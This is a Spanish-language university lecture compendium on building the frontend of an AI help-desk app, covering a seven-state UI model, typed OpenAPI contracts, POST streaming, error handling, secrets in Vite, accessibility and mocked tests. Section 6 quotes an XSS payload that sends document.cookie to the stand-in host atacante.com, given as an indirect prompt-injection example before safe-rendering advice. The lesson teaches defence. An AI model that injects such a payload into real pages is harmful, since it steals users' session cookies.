# Compendio Académico · Módulo 2 · Clase 4: Desarrollo Frontend — La Cara del Contrato, Máquina de 7 Estados, Streaming por POST y Renderizado Seguro
**Seminario de Titulación: Ingeniería de Software con IA Generativa — Desarrollo de Aplicaciones Inteligentes**  
**Módulo 2: Construcción del MVP e Integración con Modelos Generativos (Semana 2 · Jueves 22 de octubre de 2026)**  
**Carrera de Software · Universidad Regional Autónoma de los Andes (UNIANDES)**  
**Docente:** Heyler Fabio Guaza (Ing. Informático · Mg. en Ciberseguridad · OPD · Abogado)  
**Grupo de Desarrollo N.º 03:**  
- Ribera Alajo Luis Fernando  
- Morales Gonzalez Christian Guillermo  
- Iguasnia Escobar Amalia Geoconda  
**Proyecto Asignado:** **TecnoAula — Mesa de Ayuda Inteligente para Instituciones Educativas** (Caso N.º 03)  

---

## 1. El Hito de la Sesión: La Interfaz que Da la Cara por el Contrato

En la Clase 3 se construyó el backend en FastAPI y se formalizó el contrato de la API bajo OpenAPI 3.1. En la Clase 4, ese contrato se convierte en **algo tangible e interactivo que una persona puede usar**: una interfaz de usuario especializada que muestra la IA mientras piensa, gestiona fallos con serenidad y protege la seguridad del usuario y del sistema.

```
  LUN 19                  MAR 20                  MIÉ 21                  JUE 22 · HOY            VIE 23
┌───────────────────────┐┌───────────────────────┐┌───────────────────────┐┌───────────────────────┐┌───────────────────────┐
│     ARQUITECTURA      ││      INTEGRACIÓN      ││    BACKEND SEGURO     ││       FRONTEND        ││       DEMO DAY        │
│ • C4 Niveles 1 y 2    ││ • Kit y Gateway       ││ • Contrato FastAPI    ││ • Máquina 7 estados   ││ • Ensayo de demo     │
│ • ADR-001 a 003       ││ • Esquema Pydantic    ││ • Concurrencia AnyIO  ││ • Streaming por POST  ││ • Revisión 2 MVP     │
│ • Repositorio base    ││ • Prompts v1 a v3     ││ • Memoria SQLite      ││ • Renderizado seguro  ││   (10 minutos)       │
│                       ││                       ││ • Seguridad OWASP     ││ • Accesibilidad WAI   ││ • Bitácora completa  │
└───────────────────────┘└───────────────────────┘└───────────────────────┘└───────────────────────┘└───────────────────────┘
```

> **Premisa Fundamental de Diseño:**  
> *Una interfaz de IA no es un formulario clásico de tres estados (cargar, enviar, mostrar). La naturaleza estocástica, la latencia de inferencia y las cuotas de red exigen una **máquina de estados finitos resiliente**.*

---

## 2. Los Siete Estados de una Interfaz de IA

Mientras que una aplicación web convencional opera bajo el ciclo simple *Inactiva $\to$ Enviando $\to$ Completa*, una aplicación que consume modelos generativos debe modelar explícitamente **siete estados de interfaz**:

```
                       ╔═══════════════════════════════════════════════╗
                       ║   LOS SIETE ESTADOS DE UNA INTERFAZ CON IA    ║
                       ╚═══════════════════════════════════════════════╝
                                               │
         ┌──────────────────┬──────────────────┼──────────────────┬──────────────────┐
         ▼                  ▼                  ▼                  ▼                  ▼
┌─────────────────┐┌─────────────────┐┌─────────────────┐┌─────────────────┐┌─────────────────┐
│ 1. Inactiva     ││ 2. Enviando     ││ 3. Recibiendo   ││ 4. Completa     ││ 5. Revisión     │
│    (Idle)       ││    (Sending)    ││ (Streaming)     ││    (Done)       ││    Humana (200) │
├─────────────────┤├─────────────────┤├─────────────────┤├─────────────────┤├─────────────────┤
│ Esperando que   ││ Petición en red;││ Leyendo el flujo││ Salida validada ││ Modelo en duda; │
│ el docente llene││ esperando el    ││ de tokens con   ││ renderizada y   ││ derivado a un   │
│ la incidencia.  ││ primer byte.    ││ ReadableStream. ││ formulario listo││ técnico TIC.    │
└─────────────────┘└─────────────────┘└─────────────────┘└─────────────────┘└─────────────────┘
                                               │
                                 ┌─────────────┴─────────────┐
                                 ▼                           ▼
                      ┌─────────────────────┐     ┌─────────────────────┐
                      │ 6. Reintentar (429) │     │ 7. Caído (503)      │
                      ├─────────────────────┤     ├─────────────────────┤
                      │ Límite de sesión;   │     │ Ningún proveedor    │
                      │ cuenta regresiva con│     │ responde; mensaje   │
                      │ texto preservado.   │     │ sereno sin culpar.  │
                      └─────────────────────┘     └─────────────────────┘
```

### 2.1. Modelado Robusto con Uniones Discriminadas en TypeScript
Para evitar estados imposibles o inconsistentes (por ejemplo, que la interfaz muestre a la vez un spinner de carga y un mensaje de error), el estado se modela como una **unión discriminada**:

```typescript
// src/tipos/estado.ts
export type EstadoUI =
  | { tipo: "inactiva" }
  | { tipo: "enviando" }
  | { tipo: "recibiendo"; textoAcumulado: string }
  | { tipo: "completa"; resultado: ClasificacionTicketOut }
  | { tipo: "revision_humana"; mensaje: string; ticketId: string }
  | { tipo: "reintentar"; segundosRestantes: number; textoPreservado: string }
  | { tipo: "caido"; mensaje: string };
```

* **Regla de UX:** *Los estados imposibles no se pueden escribir ni renderizar.*

---

## 3. Contrato Primero: Tipado Extremo a Extremo con OpenAPI

En la ingeniería de software profesional, **los tipos del frontend nunca se escriben ni copian a mano desde el backend**. Si el desarrollador backend renombra un atributo en Pydantic y el frontend lo copia manualmente, se introducen desajustes silenciosos que solo explotan en producción.

```
┌─────────────────────────┐                            ┌─────────────────────────┐
│     BACKEND FASTAPI     │                            │     FRONTEND REACT      │
│     app/schemas.py      │                            │     src/api/esquema.ts  │
├─────────────────────────┤                            ├─────────────────────────┤
│ class ClasificacionOut: │  npx openapi-typescript    │ export type components= │
│   categoria: str        ├───────────────────────────►│   schemas: {            │
│   prioridad: str        │                            │     ClasificacionOut: { │
│   urgencia: str         │                            │       categoria: string │
└─────────────────────────┘                            └─────────────────────────┘
```

### 3.1. Generación Automatizada
Mediante la herramienta `openapi-typescript`, el frontend descarga la especificación viva generada por FastAPI:
```bash
npx openapi-typescript http://localhost:8000/openapi.json -o src/api/esquema.ts
```

```typescript
// src/hooks/useClasificacion.ts
import type { components } from "../api/esquema";

type ClasificacionTicketOut = components["schemas"]["ClasificacionTicketOut"];

function renderizarTicket(ticket: ClasificacionTicketOut) {
  if (ticket.requiere_revision_humana) {
    mostrarAvisoRevisionHumana(ticket.resumen);
  } else {
    actualizarTableroKanban(ticket.prioridad, ticket.categoria);
  }
}
```

* **Ventaja nuclear:** Si el backend altera el contrato, el proyecto frontend **deja de compilar inmediatamente en la máquina del desarrollador (`npm run build`)**, detectando el fallo antes del despliegue.
* **Cero sobrecosto:** Son tipos puros de TypeScript; desaparecen tras la compilación y no añaden ni un solo byte al bundle final de producción.

---

## 4. Streaming por POST con `ReadableStream` y `AbortController`

La API nativa del navegador `EventSource` fue diseñada exclusivamente para solicitudes HTTP `GET`. En aplicaciones de IA Generativa, las solicitudes que inician un chat o análisis envían payloads complejos en formato JSON en el cuerpo de una petición **HTTP `POST`**.

### 4.1. Mecánica de Lectura del Flujo de Tokens
El frontend debe consumir el flujo utilizando la API moderna de Streams (`fetch` + `ReadableStream` + `TextDecoderStream`):

```typescript
// src/api/streaming.ts
export async function enviarConsultaConStreaming(
  promptUsuario: string,
  onToken: (token: string) => void,
  onFin: () => void,
  signal: AbortSignal
) {
  const respuesta = await fetch("/v1/chat/stream", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ mensaje: promptUsuario }),
    signal // Permite cancelar la llamada con AbortController
  });

  if (!respuesta.ok || !respuesta.body) {
    throw new Error(`Error en el servidor: ${respuesta.status}`);
  }

  const lector = respuesta.body
    .pipeThrough(new TextDecoderStream())
    .getReader();

  let buffer = "";

  while (true) {
    const { value, done } = await lector.read();
    if (done) break;

    buffer += value;
    // La red fragmenta los trozos arbitrariamente; separamos por delimitador SSE
    const eventos = buffer.split("\n\n");
    buffer = eventos.pop() || ""; // Conservar el trozo incompleto en el buffer

    for (const eventoStr of eventos) {
      if (eventoStr.includes("event: token")) {
        const lineas = eventoStr.split("\n");
        const lineaData = lineas.find(l => l.startsWith("data: "));
        if (lineaData) {
          const token = JSON.parse(lineaData.slice(6));
          onToken(token);
        }
      } else if (eventoStr.includes("event: fin")) {
        onFin();
      }
    }
  }
}
```

### 4.2. El Botón "Detener Generación" (*AbortController*)
* **Mecánica:** Se instancia `const ctrl = new AbortController()`. Al pulsar el botón *Detener*, se ejecuta `ctrl.abort()`.
* **Beneficio doble:**  
  1. Corta inmediatamente la conexión HTTP en el cliente.
  2. Notifica al backend (que detecta la desconexión del socket), cancelando el generador en `llm.py` y **deteniendo el consumo de tokens en la API de Gemini/Groq**.

---

## 5. Matriz de Reacción de la Interfaz ante Códigos HTTP

La interfaz de usuario debe reaccionar de forma predecible y constructiva ante cada respuesta emitida por el backend:

| Código HTTP / Evento | Significado en el Backend | Reacción Visual en la Interfaz de Usuario |
| :--- | :--- | :--- |
| **`201 Created`** | Ticket o análisis procesado y guardado en SQLite con éxito. | Renderiza la tarjeta en la columna correspondiente del tablero Kanban y limpia el formulario de ingreso. |
| **`200 OK` (`requiere_revision_humana=True`)** | El modelo presentó incertidumbre o salida no estructurada. | **Aviso sereno:** Notifica que la incidencia fue registrada y asignada a revisión técnica manual. **No muestra un error rojo.** |
| **`422 Unprocessable Entity`** | Datos de entrada inválidos (ej. < 10 caracteres o formato erróneo). | Resalta visualmente el campo en rojo; **conserva intacto el texto escrito** por el docente para que no pierda su trabajo. |
| **`429 Too Many Requests` (`Retry-After: N`)** | Se alcanzó la cuota de la sesión. | Muestra un **contador regresivo en segundos** («Reintentando en 6s...») y deshabilita temporalmente el botón de envío. |
| **`503 Service Unavailable`** | Proveedores de IA caídos o saturados. | Muestra un mensaje comprensible («Servicio momentáneamente congestionado; intente en unos minutos») sin culpar al usuario. |
| **`event: error` (SSE)** | Caída de red a mitad del streaming. | **Conserva en pantalla todo el texto emitido hasta el fallo** y ofrece un botón de reintento. |

> [!TIP]
> **Detalle crítico de CORS en el Backend:**  
> Para que el código JavaScript del navegador pueda leer la cabecera `Retry-After` cuando el frontend y el backend corren en dominios o puertos distintos (ej. React en `:5173` y FastAPI en `:8000`), el backend debe declararla explícitamente:  
> `CORSMiddleware(..., expose_headers=["Retry-After"])`. De lo contrario, el navegador bloquea la lectura de la cabecera por seguridad.

---

## 6. Renderizado Seguro y Prevención de Inyecciones (OWASP LLM05)

La vulnerabilidad **OWASP LLM05: Manejo Inadecuado de Salidas (*Improper Output Handling*)** ocurre cuando el frontend asume que el texto generado por un LLM es confiable y lo inyecta directamente en el Document Object Model (DOM).

```javascript
// ATAQUE INDIRECTO POR INYECCIÓN DE PROMPT:
// Una solicitud técnica maliciosa incluye:
// "Fallo en proyector <img src=x onerror=\"fetch('https://atacante.com/robo?c='+document.cookie)\">"
```

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                       POLÍTICA DE RENDERIZADO SEGURO                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ❌ PELIGRO MORTAL (Se ejecuta el script):                                 │
│   elemento.innerHTML = respuestaModelo;                                     │
│   <div dangerouslySetInnerHTML={{ __html: respuestaModelo }} />            │
│                                                                             │
│   ✅ SEGURO POR DEFECTO (Se muestra como texto plano):                     │
│   <p>{respuestaModelo}</p>                                                  │
│   elemento.textContent = respuestaModelo;                                   │
│                                                                             │
│   🛡️ SI SE REQUIERE FORMATEAR MARKDOWN:                                    │
│   El orden es estricto: primero se convierte a HTML y luego se sanitiza:   │
│   const htmlSeguro = DOMPurify.sanitize(marked.parse(respuestaModelo));     │
│   // Enlaces restringidos exclusivamente a http/https con rel="noopener"   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 7. Gestión de Secretos en el Cliente (OWASP LLM02)

Todo recurso o variable enviado al navegador es de **acceso público irrestricto**. Cualquier usuario puede inspeccionar el bundle compilado en las herramientas de desarrollo o buscar cadenas con `curl`.

### 7.1. El Peligro del Prefijo `VITE_`
En herramientas modernas de empaquetado como Vite:
- Toda variable en `.env` que comience con `VITE_` se incrusta estáticamente en el código JavaScript compilado dentro de la carpeta `dist/`.
- `VITE_BACKEND_URL=http://localhost:8000` $\to$ Correcto (es la dirección pública del backend).
- `VITE_GEMINI_API_KEY=AIzaSy...` $\to$ **PROHIBICIÓN ESTRICTA.** La clave queda expuesta en texto plano para cualquier visitante de la página.

> [!CAUTION]
> **Prueba de Verificación Previa al Demo Day:**  
> Tras ejecutar `npm run build`, se debe ejecutar una búsqueda de seguridad en el directorio compilado:  
> `grep -rn "AIza" dist/` o `grep -rn "gsk_" dist/`.  
> Si el comando arroja un solo resultado, el proyecto reprueba el criterio de seguridad con calificación cero (0).

---

## 8. Persistencia de Sesión vs. Memoria del Historial

El frontend gestiona la identidad efímera de la sesión, pero **nunca almacena ni transmite el contenido del historial de conversación**:

```
┌──────────────────┐                ┌──────────────────┐                ┌──────────────────┐
│    NAVEGADOR     │  session_id    │     BACKEND      │  historial     │     MODELO       │
│  sessionStorage  ├───────────────►│  SQLite / Memoria├───────────────►│  Gemini / Groq   │
│  guarda solo UUID│  + texto nuevo │  valida y lee DB │  verificado    │                  │
└──────────────────┘                └──────────────────┘                └──────────────────┘
```

```javascript
// Inicialización segura de sesión en el navegador
let sessionId = sessionStorage.getItem("tecnoaula_sid");
if (!sessionId) {
  sessionId = crypto.randomUUID();
  sessionStorage.setItem("tecnoaula_sid", sessionId);
}
```

* **`sessionStorage`:** Aísla la sesión a una sola pestaña del navegador. Ideal para pruebas de evaluación y soporte puntual.
* **`localStorage`:** Persiste al cerrar la ventana; requiere implementar un botón visible de *«Nueva incidencia»* para regenerar el UUID.
* **`Cookie HttpOnly`:** El estándar de máxima seguridad en producción, donde JavaScript no tiene acceso de lectura a la cookie.

---

## 9. Accesibilidad Web (WAI-ARIA y WCAG 2.2) en Interfaces con Streaming

Las aplicaciones inteligentes con respuestas generadas dinámicamente suelen ser hostiles para usuarios que dependen de lectores de pantalla (*screen readers* como VoiceOver o NVDA).

### 9.1. El Problema del Lector Parlanchín
Si se coloca `aria-live="assertive"` sobre un contenedor de chat con streaming, el lector de pantalla intentará verbalizar cada token individual recibido, interrumpiendo al usuario hasta 300 veces por minuto con fragmentos ininteligibles.

### 9.2. Patrón de Accesibilidad Recomendado
```html
<!-- Contenedor accesible para respuestas de IA -->
<div 
  aria-live="polite" 
  aria-busy="true" 
  id="respuesta-asistente">
  {textoStreaming}
</div>

<!-- Notificación inmediata solo para fallos críticos -->
<div role="alert" id="mensaje-error">
  {mensaje429o503}
</div>
```

* **`aria-live="polite"`:** Espera pacientemente a que el usuario termine su acción en curso antes de anunciar novedades.
* **`aria-busy="true"`:** Indica al sintetizador de voz que la región está recibiendo actualizaciones activas; el lector verbaliza la respuesta **una sola vez completa cuando la bandera pasa a `false` al llegar el evento `fin`**.
* **Navegación por teclado:**  
  * `Enter`: Envía el formulario.  
  * `Escape`: Aborta la generación en curso invocando `AbortController.abort()`.  
  * El foco del cursor retorna automáticamente al campo de entrada al concluir la respuesta.
* **Sensibilidad al movimiento:** Respetar la directiva CSS `@media (prefers-reduced-motion: reduce)` desactivando efectos de cursor parpadeante o tipeo simulado.

---

## 10. Diseñar la Confianza (*Trust by Design*)

La confianza del usuario en un sistema con IA no se solicita; **se gana mediante la transparencia y el reconocimiento explícito de la incertidumbre**:

1. **Declaración Explícita:** Todo panel o tarjeta generada debe incluir una etiqueta visible permanente:  
   🏷️ *«Clasificación asistida por IA generativa»*.
2. **Normalización de la Duda:** El estado de derivación a soporte técnico humano no se presenta como un fallo humillante, sino como un **protocolo de calidad responsable**:  
   *«Esta incidencia ha sido transferida directamente al equipo técnico de infraestructura para atención prioritaria.»*
3. **Mecanismo de Evaluación Continua (*Feedback Loop*):**  
   Incorporación de botones de retroalimentación discreta (pulgar arriba 👍 / pulgar abajo 👎). El clic registra un evento en la base de datos de observabilidad sin recargar la página, alimentando la evaluación de calidad de la Semana 3.

---

## 11. Estrategia de Pruebas del Frontend sin Dependencia del Modelo

De la misma manera que el backend no llama al LLM en sus pruebas unitarias, **el frontend se prueba sin realizar llamadas de red al backend real**, empleando herramientas de simulación de contratos:

```
                           ╔═══════════════════════════════╗
                           ║   PIRÁMIDE DE PRUEBAS FRONT   ║
                           ╚═══════════════════════════════╝
                                           │
                                  ┌────────┴────────┐
                                  ▼                 ▼
                       ┌──────────────────┐ ┌──────────────────┐
                       │ 1. Componentes   │ │ 2. Flujo Completo│
                       │    y Estados     │ │    End-to-End    │
                       │ (Vitest + MSW)   │ │   (Playwright)   │
                       ├──────────────────┤ ├──────────────────┤
                       │ Simula respuestas│ │ Levanta el       │
                       │ 201, 200, 422,   │ │ navegador real,  │
                       │ 429 y streams SSE│ │ llena formulario │
                       │ en memoria.      │ │ y toma capturas. │
                       └──────────────────┘ └──────────────────┘
```

### 11.1. Intercepción de Red con Mock Service Worker (MSW)
```typescript
// tests/mocks/handlers.ts
import { http, HttpResponse } from "msw";

export const handlers = [
  // Simulación de límite de cuota HTTP 429 con cabecera Retry-After
  http.post("/v1/clasificar", () => {
    return HttpResponse.json(
      {
        type: "/errores/limite-alcanzado",
        title: "Demasiadas solicitudes",
        status: 429,
        detail: "Espera 6 segundos e intenta de nuevo."
      },
      {
        status: 429,
        headers: { "Retry-After": "6", "Content-Type": "application/problem+json" }
      }
    );
  })
];
```

* **Playwright para Evidencia Técnica:** Ejecuta el flujo e2e en un navegador automatizado sin intervención humana y genera capturas de pantalla automáticas para la bitácora de `docs/evidencias/semana-2/`.

---

## 12. Referencias Bibliográficas Consolidadas (Normas APA 7ma Edición)

* DOMPurify. (2026). *DOMPurify: A DOM-only, super-fast, uber-tolerant XSS sanitizer for HTML, MathML and SVG*. Cure53. https://github.com/cure53/DOMPurify
* Google Cloud. (2026). *Gemini API: Client-side integration and security best practices*. Google for Developers. https://ai.google.dev/
* Microsoft. (2026). *Playwright: Fast and reliable end-to-end testing for modern web apps*. Microsoft Documentation. https://playwright.dev/
* Mock Service Worker. (2026). *MSW: Seamless API mocking for JavaScript, TypeScript, and Node*. https://mswjs.io/
* OpenAPI Initiative. (2026). *OpenAPI Specification v3.1.0*. Linux Foundation. https://spec.openapis.org/oas/v3.1.0
* OWASP Foundation. (2025). *OWASP Top 10 for Large Language Model Applications 2025* (Versión 2.0). OWASP GenAI Project. https://genai.owasp.org/llmrisk/
* React. (2026). *React 19 documentation: Actions, useActionState, and optimistic updates*. Meta Open Source. https://react.dev/
* Vite. (2026). *Vite: Next Generation Frontend Tooling*. https://vitejs.dev/
* W3C. (2023). *Web Content Accessibility Guidelines (WCAG) 2.2*. World Wide Web Consortium. https://www.w3.org/TR/WCAG22/
* W3C. (2024). *Accessible Rich Internet Applications (WAI-ARIA) 1.2*. World Wide Web Consortium. https://www.w3.org/TR/wai-aria-1.2/
